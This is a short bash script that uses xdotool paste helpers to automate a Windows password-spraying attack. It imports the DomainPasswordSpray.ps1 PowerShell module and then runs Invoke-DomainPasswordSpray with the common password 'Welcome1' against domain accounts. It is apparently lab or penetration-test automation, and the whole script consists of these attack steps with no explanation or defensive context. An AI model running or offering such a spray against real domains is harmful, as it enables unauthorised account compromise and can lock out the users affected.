#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "Import-Module .\DomainPasswordSpray.ps1"
xdotool key Return

sleep 2

paste_command "Invoke-DomainPasswordSpray -Password Welcome1"
